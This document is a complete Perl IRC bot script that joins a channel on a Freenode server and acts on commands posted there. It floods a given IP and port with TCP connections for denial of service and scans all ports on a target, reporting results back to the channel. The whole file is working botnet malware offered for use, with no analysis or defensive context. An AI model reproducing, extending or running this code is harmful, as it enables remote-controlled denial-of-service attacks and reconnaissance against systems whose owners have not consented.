#!/usr/bin/perl

use IO::Socket;

#------------------------------------------------------#

# Generates bots names.
$nm = "bonux".rand(99999999999999);

# Global variables.
my $sala 	= "#milk";
my $user 	= "-$nm";
my $nick 	= "$nm";
my $d	 	= "disabled";
my $o,$fa,$cnt	= 0;
my $cnt2	= 0;

#------------------------------------------------------#
sub dos(){
	# DOS function
	$po=int($po);
	$cn=int($cn);
	while($o <= $cn){
		$dos = IO::Socket::INET->new(
 			PeerAddr	=>	$ip,
        		PeerPort	=>	$po,
        		Timeout		=>	1 );
	
		if($dos){
			if($cnt == 10000){
				print $con "PRIVMSG $sala :[ #On ]\r\n";
				$cnt=0;
			}
			$cnt++;
		}else{
			if($cnt2 == 100){
				print $con "PRIVMSG $sala :[ Off ]\r\n";
				$cnt2=0;
			}
			$cnt2++;
		}
		$o++;
	}
	print $con "PRIVMSG $sala :--------------- \r\n";
	print "\n";
	$cnt=0;
	$cnt2=0;
	$o=0;
}
#------------------------------------------------------#
sub farejador(){
	# Sniff ports.
	while($o <= 65900){
		$farej = IO::Socket::INET->new(
 			PeerAddr	=>	$farejador_ip,
        		PeerPort	=>	$o,
        		Timeout		=>	1 );
	
		if($farej){
			print $con "PRIVMSG $sala :Port $o \r\n";
		}
		$o++;
	}
	print $con "PRIVMSG $sala :--------------- \r\n";
	print "\n";
	$o=0;
}
#------------------------------------------------------#

$con = IO::Socket::INET->new(PeerAddr=>'zelazny.freenode.net',
			     PeerPort=>'6667',
			     Proto=>'tcp',
			     Timeout=>'10') || print ":(\n";

print $con "USER $user\r\n";
print $con "NICK $nick\r\n";
print $con "JOIN $sala\r\n";

#------------------------------------------------------#

while($resp = <$con>){

	# Shows messages.
	print $resp;

	# Checks status.
	if(($resp =~ /PRIVMSG/) && ($resp =~ /status/i)){
		# Awnser the message.
		print $con "PRIVMSG $sala :Active\r\n";
	}

	# Active DOS.
	if(($resp =~ /PRIVMSG/) && ($resp =~ /dos/i) || ($d eq "Active")){
		
		if($d ne "Active"){
			print $con "PRIVMSG $sala :DOS Active!\r\n";
		}		

		if( ($d eq "Active") && ($abc == 0) ){
			$do=0;
			$abc=1;
		}
		$d = "Active";

		if($do == 0){
			# Gets the IP address.
			if($resp =~ m/.*?IP (.*?)$/gi){
				$ip=$1;
				$do=1;
			}
			next;
		}

		if($do == 1){
			# Gets the port address.
			if($resp =~ m/.*?PORT (.*?)$/gi){
				$po=$1;
				$do=2;
			}
			next;
		}

		if($do == 2){
			# Checks the connection number.
			if($resp =~ m/.*?CON (.*?)$/gi){
				$cn=$1;
				$d = "disabled";
			}

			# Complete
			dos();
			next;
		}

	}

	# Sniff
	if(($resp =~ /PRIVMSG/) && ($resp =~ /farejador/i) || $fa == 1){
			
			if($fa == 1){
				# Gets the IP
				if($resp =~ m/.*?IP (.*?)$/gi){
					$farejador_ip=$1;
					$fa = 0;

					# Complete
					farejador();
					next;
				}
			}
			$fa = 1;		

	}

	# Awnser for ping requests.
	if($resp =~ m/^PING (.*?)$/gi){
		print $con "PONG ".$1."\r\n";
	}
}
